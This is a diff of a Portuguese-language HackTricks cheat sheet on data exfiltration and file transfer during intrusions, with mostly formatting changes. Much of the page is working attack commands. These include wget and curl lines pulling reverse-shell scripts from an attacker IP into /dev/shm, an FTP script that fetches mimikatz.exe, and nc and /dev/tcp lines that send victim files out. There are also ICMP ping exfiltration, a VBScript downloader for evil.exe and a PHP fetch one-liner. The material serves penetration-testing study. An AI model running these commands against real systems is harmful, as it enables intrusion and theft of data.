@@ -1,4 +1,6 @@
-# Exfiltração
+# Exfiltration
+
+## Exfiltração
 
 <details>
 
@@ -17,32 +19,39 @@
 
 {% embed url="https://go.intigriti.com/hacktricks" %}
 
-## Domínios comumente permitidos para exfiltrar informações
+### Domínios comumente permitidos para exfiltrar informações
 
 Verifique [https://lots-project.com/](https://lots-project.com/) para encontrar domínios comumente permitidos que podem ser abusados
 
-## Copiar e colar Base64
+### Copiar e colar Base64
 
 **Linux**
+
 ```bash
 base64 -w0 <file> #Encode file
 base64 -d file #Decode file
 ```
+
 **Windows**
+
 ```
 certutil -encode payload.dll payload.b64
 certutil -decode payload.b64 payload.dll
 ```
-## HTTP
+
+### HTTP
 
 **Linux**
+
 ```bash
 wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
 wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
 curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
 fetch 10.10.14.14:8000/shell.py #FreeBSD
 ```
+
 **Windows**
+
 ```bash
 certutil -urlcache -split -f http://webserver/payload.b64 payload.b64
 bitsadmin /transfer transfName /priority high http://example.com/examplefile.pdf C:\downloads\examplefile.pdf
@@ -57,11 +66,13 @@ Start-BitsTransfer -Source $url -Destination $output
 #OR
 Start-BitsTransfer -Source $url -Destination $output -Asynchronous
 ```
-### Enviar arquivos
+
+#### Enviar arquivos
 
 * [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
 * [**SimpleHttpServer imprimindo GET e POSTs (também cabeçalhos)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
 * Módulo Python [uploadserver](https://pypi.org/project/uploadserver/):
+
 ```bash
 # Listen to files
 python3 -m pip install --user uploadserver
@@ -74,17 +85,19 @@ curl -X POST http://HOST/upload -H -F 'files=@file.txt'
 # With basic auth:
 # curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
 ```
-### **Servidor HTTPS**
 
----
+#### **Servidor HTTPS**
 
-#### **Description**
+
+
+**Description**
 
 The HTTPS server exfiltration method involves setting up a web server that uses HTTPS to encrypt the communication between the server and the client. This method is useful when the target network is monitored for suspicious traffic and the use of HTTPS is not considered suspicious.
 
-#### **Description**
+**Description**
 
 O método de exfiltração do servidor HTTPS envolve a configuração de um servidor web que usa HTTPS para criptografar a comunicação entre o servidor e o cliente. Este método é útil quando a rede de destino é monitorada para tráfego suspeito e o uso de HTTPS não é considerado suspeito.
+
 ```python
 # from https://gist.github.com/dergachev/7028596
 # taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
@@ -125,14 +138,17 @@ if __name__ == "__main__":
     app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
 ###
 ```
-## FTP
 
-### Servidor FTP (Python)
+### FTP
+
+#### Servidor FTP (Python)
+
 ```bash
 pip3 install pyftpdlib
 python3 -m pyftpdlib -p 21
 ```
-### Servidor FTP (NodeJS)
+
+#### Servidor FTP (NodeJS)
 
 O servidor FTP é uma das maneiras mais comuns de transferir arquivos de um sistema para outro. O NodeJS oferece uma biblioteca nativa para criar um servidor FTP. O código abaixo mostra como criar um servidor FTP simples usando o NodeJS:
 
@@ -154,21 +170,24 @@ ftpServer.listen()
 ```
 
 Este código cria um servidor FTP que escuta na porta 3333 e permite conexões anônimas. Quando um usuário se conecta, o servidor FTP retorna uma mensagem de boas-vindas. O evento `login` é acionado quando um usuário faz login no servidor FTP. Neste exemplo, o servidor FTP retorna o diretório raiz `/path/to/ftp/root` para o usuário.
+
 ```
 sudo npm install -g ftp-srv --save
 ftp-srv ftp://0.0.0.0:9876 --root /tmp
 ```
-### Servidor FTP (pure-ftp)
+
+#### Servidor FTP (pure-ftp)
 
 O protocolo FTP é um dos protocolos mais antigos e amplamente utilizados para transferência de arquivos. O servidor FTP Pure-FTP é uma implementação popular do protocolo FTP que é conhecida por sua simplicidade e facilidade de uso. No entanto, como muitos servidores FTP, o Pure-FTP não é seguro por padrão e pode ser vulnerável a ataques de exfiltração de dados.
 
 Existem várias técnicas que podem ser usadas para exfiltrar dados de um servidor FTP, incluindo:
 
-- Transferência de arquivos para um servidor remoto: um invasor pode usar o cliente FTP para transferir arquivos do servidor comprometido para um servidor remoto controlado pelo invasor.
-- Transferência de arquivos para um servidor de terceiros: um invasor pode usar o cliente FTP para transferir arquivos do servidor comprometido para um servidor de terceiros que não esteja sob seu controle.
-- Transferência de arquivos para um serviço de armazenamento em nuvem: um invasor pode usar o cliente FTP para transferir arquivos do servidor comprometido para um serviço de armazenamento em nuvem, como o Dropbox ou o Google Drive.
+* Transferência de arquivos para um servidor remoto: um invasor pode usar o cliente FTP para transferir arquivos do servidor comprometido para um servidor remoto controlado pelo invasor.
+* Transferência de arquivos para um servidor de terceiros: um invasor pode usar o cliente FTP para transferir arquivos do servidor comprometido para um servidor de terceiros que não esteja sob seu controle.
+* Transferência de arquivos para um serviço de armazenamento em nuvem: um invasor pode usar o cliente FTP para transferir arquivos do servidor comprometido para um serviço de armazenamento em nuvem, como o Dropbox ou o Google Drive.
 
 Para evitar a exfiltração de dados por meio do servidor FTP, é importante implementar medidas de segurança, como criptografia de dados em trânsito e autenticação forte. Além disso, é importante monitorar o tráfego de rede em busca de atividades suspeitas e limitar o acesso ao servidor FTP apenas a usuários autorizados.
+
 ```bash
 apt-get update && apt-get install pure-ftp
 ```
@@ -186,7 +205,9 @@ mkdir -p /ftphome
 chown -R ftpuser:ftpgroup /ftphome/
 /etc/init.d/pure-ftpd restart
 ```
-### Cliente **Windows**
+
+#### Cliente **Windows**
+
 ```bash
 #Work well with python. With pure-ftp use fusr:ftp
 echo open 10.11.0.41 21 > ftp.txt
@@ -197,16 +218,20 @@ echo GET mimikatz.exe >> ftp.txt
 echo bye >> ftp.txt
 ftp -n -v -s:ftp.txt
 ```
-## SMB
+
+### SMB
 
 Kali como servidor
+
 ```bash
 kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
 kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
 #For new Win10 versions
 impacket-smbserver -smb2support -user test -password test test `pwd`
 ```
+
 Ou crie um compartilhamento smb **usando o samba**:
+
 ```bash
 apt-get install samba
 mkdir /tmp/smb
@@ -221,29 +246,31 @@ chmod 777 /tmp/smb
 #Start samba
 service smbd restart
 ```
-# Exfiltração em Windows
+
+## Exfiltração em Windows
 
 A exfiltração de dados em sistemas Windows pode ser realizada de várias maneiras, incluindo:
 
-## 1. Uso de ferramentas de linha de comando
+### 1. Uso de ferramentas de linha de comando
 
 As ferramentas de linha de comando do Windows, como `bitsadmin`, `certutil`, `powershell`, `netsh`, `reg`, `wevtutil`, `wmic`, entre outras, podem ser usadas para exfiltrar dados. Essas ferramentas podem ser usadas para codificar, compactar e enviar dados para um servidor remoto.
 
-## 2. Uso de ferramentas de terceiros
+### 2. Uso de ferramentas de terceiros
 
 Existem várias ferramentas de terceiros que podem ser usadas para exfiltrar dados em sistemas Windows, como `QuasarRAT`, `Meterpreter`, `Pupy`, `Empire`, `Cobalt Strike`, entre outras. Essas ferramentas geralmente fornecem recursos avançados de exfiltração, como criptografia, compactação e ofuscação de dados.
 
-## 3. Uso de técnicas de tunelamento
+### 3. Uso de técnicas de tunelamento
 
 As técnicas de tunelamento, como `HTTP Tunneling`, `DNS Tunneling`, `ICMP Tunneling`, `TCP Tunneling`, `SMB Tunneling`, entre outras, podem ser usadas para exfiltrar dados em sistemas Windows. Essas técnicas permitem que os dados sejam encapsulados em protocolos de rede legítimos e enviados para um servidor remoto.
 
-## 4. Uso de serviços de armazenamento em nuvem
+### 4. Uso de serviços de armazenamento em nuvem
 
 Os serviços de armazenamento em nuvem, como `Dropbox`, `Google Drive`, `OneDrive`, `Box`, entre outros, podem ser usados para exfiltrar dados em sistemas Windows. Esses serviços permitem que os dados sejam armazenados em um servidor remoto e acessados por meio de um aplicativo ou navegador da web.
 
-## 5. Uso de dispositivos de armazenamento externos
+### 5. Uso de dispositivos de armazenamento externos
 
 Os dispositivos de armazenamento externos, como `USB`, `CD`, `DVD`, `HD externo`, entre outros, podem ser usados para exfiltrar dados em sistemas Windows. Esses dispositivos permitem que os dados sejam armazenados fisicamente e transportados para outro local.
+
 ```bash
 CMD-Wind> \\10.10.14.14\path\to\exe
 CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials
@@ -251,21 +278,26 @@ CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentia
 WindPS-1> New-PSDrive -Name "new_disk" -PSProvider "FileSystem" -Root "\\10.10.14.9\kali"
 WindPS-2> cd new_disk:
 ```
-## SCP
+
+### SCP
 
 O atacante precisa ter o SSHd em execução.
+
 ```bash
 scp <username>@<Attacker_IP>:<directory>/<filename> 
 ```
-## SSHFS
+
+### SSHFS
 
 Se a vítima tiver SSH, o atacante pode montar um diretório da vítima para o atacante.
+
 ```bash
 sudo apt-get install sshfs
 sudo mkdir /mnt/sshfs
 sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
 ```
-## NC
+
+### NC
 
 O comando `nc` (netcat) é uma ferramenta de rede que pode ser usada para transferir dados de um host para outro. Ele pode ser usado para exfiltrar dados de um sistema comprometido para um host controlado pelo atacante.
 
@@ -292,31 +324,38 @@ nc <attacker_ip> <port> < file_to_transfer
 ```
 
 Isso enviará o arquivo `file_to_transfer` para o host controlado pelo atacante na porta especificada.
+
 ```bash
 nc -lvnp 4444 > new_file
 nc -vn <IP> 4444 < exfil_file
 ```
-## /dev/tcp
 
-### Baixar arquivo da vítima
+### /dev/tcp
+
+#### Baixar arquivo da vítima
+
 ```bash
 nc -lvnp 80 > file #Inside attacker
 cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
 ```
-### Enviar arquivo para a vítima
+
+#### Enviar arquivo para a vítima
+
 ```bash
 nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
 # Inside victim
 exec 6< /dev/tcp/10.10.10.10/4444
 cat <&6 > file.txt
 ```
-## **ICMP**
+
+### **ICMP**
 
 O Protocolo de Mensagem de Controle da Internet (ICMP) é um protocolo de camada de rede usado para enviar mensagens de erro e informações operacionais sobre problemas de rede. O ICMP é frequentemente usado em conjunto com outras ferramentas de rede para testar a conectividade da rede e diagnosticar problemas de rede.
 
 O ICMP pode ser usado para exfiltrar dados de uma rede, enviando pacotes ICMP com dados ocultos no campo de carga útil. Isso é conhecido como "túnel ICMP". O tráfego ICMP é frequentemente permitido em firewalls e outras soluções de segurança, tornando o túnel ICMP uma técnica de exfiltração atraente.
 
 Existem várias ferramentas disponíveis para criar túneis ICMP, incluindo ICMPTunnel e PingTunnel. Essas ferramentas permitem que um invasor crie um túnel ICMP entre um sistema comprometido e um servidor controlado pelo invasor, permitindo que os dados sejam exfiltrados da rede comprometida.
+
 ```bash
 # To exfiltrate the content of a file via pings you can do:
 xxd -p -c 4 /path/file/exfil | while read line; do ping -c 1 -p $line <IP attacker>; done
@@ -334,47 +373,61 @@ def process_packet(pkt):
 
 sniff(iface="tun0", prn=process_packet)
 ```
-## **SMTP**
+
+### **SMTP**
 
 Se você pode enviar dados para um servidor SMTP, você pode criar um SMTP para receber os dados com python:
+
 ```bash
 sudo python -m smtpd -n -c DebuggingServer :25
 ```
-## TFTP
+
+### TFTP
 
 Por padrão no XP e 2003 (em outros sistemas operacionais é necessário adicioná-lo explicitamente durante a instalação)
 
 No Kali, **inicie o servidor TFTP**:
+
 ```bash
 #I didn't get this options working and I prefer the python option
 mkdir /tftp
 atftpd --daemon --port 69 /tftp
 cp /path/tp/nc.exe /tftp
 ```
+
 **Servidor TFTP em Python:**
 
 Um servidor TFTP é uma ferramenta útil para exfiltrar dados de uma rede. O TFTP é um protocolo simples que permite a transferência de arquivos entre dispositivos em uma rede. O servidor TFTP em Python é uma implementação fácil de usar que pode ser personalizada para atender às necessidades específicas de um teste de penetração. O código-fonte do servidor TFTP em Python pode ser encontrado em vários repositórios online e pode ser facilmente modificado para atender às necessidades do usuário.
+
 ```bash
 pip install ptftpd
 ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
 ```
+
 No **alvo**, conecte-se ao servidor Kali:
+
 ```bash
 tftp -i <KALI-IP> get nc.exe
 ```
-## PHP
+
+### PHP
 
 Baixe um arquivo com um PHP oneliner:
+
 ```bash
 echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
 ```
-## VBScript
+
+### VBScript
 
 VBScript é uma linguagem de script da Microsoft que é usada para automatizar tarefas em sistemas Windows. É uma linguagem de script interpretada que é executada pelo Windows Script Host. VBScript é uma linguagem de programação fácil de aprender e é usada para criar scripts que podem ser usados para exfiltrar dados de um sistema. Existem várias técnicas que podem ser usadas para exfiltrar dados usando VBScript, incluindo o uso de FTP, HTTP e SMTP. O VBScript também pode ser usado para criar backdoors em sistemas Windows, permitindo que um invasor acesse o sistema remotamente.
+
 ```bash
 Attacker> python -m SimpleHTTPServer 80
 ```
+
 **Vítima**
+
 ```bash
 echo strUrl = WScript.Arguments.Item(0) > wget.vbs
 echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
@@ -406,21 +459,26 @@ echo ts.Close >> wget.vbs
 ```bash
 cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
-## Debug.exe
+
+### Debug.exe
 
 Esta é uma técnica maluca que funciona em máquinas Windows de 32 bits. A ideia é usar o programa `debug.exe`. Ele é usado para inspecionar binários, como um depurador. Mas também pode reconstruí-los a partir de hex. Então, a ideia é que pegamos binários, como `netcat`. E então desmontamos em hex, colamos em um arquivo na máquina comprometida e, em seguida, montamos com `debug.exe`.
 
 `Debug.exe` só pode montar 64 kb. Então, precisamos usar arquivos menores que isso. Podemos usar o upx para comprimi-lo ainda mais. Então, vamos fazer isso:
+
 ```
 upx -9 nc.exe
 ```
+
 Agora ele pesa apenas 29 kb. Perfeito. Então, agora vamos desmontá-lo:
+
 ```
 wine exe2bat.exe nc.exe nc.txt
 ```
+
 Agora basta copiar e colar o texto em nosso shell do Windows. E ele criará automaticamente um arquivo chamado nc.exe
 
-## DNS
+### DNS
 
 * [https://github.com/62726164/dns-exfil](https://github.com/62726164/dns-exfil)
 
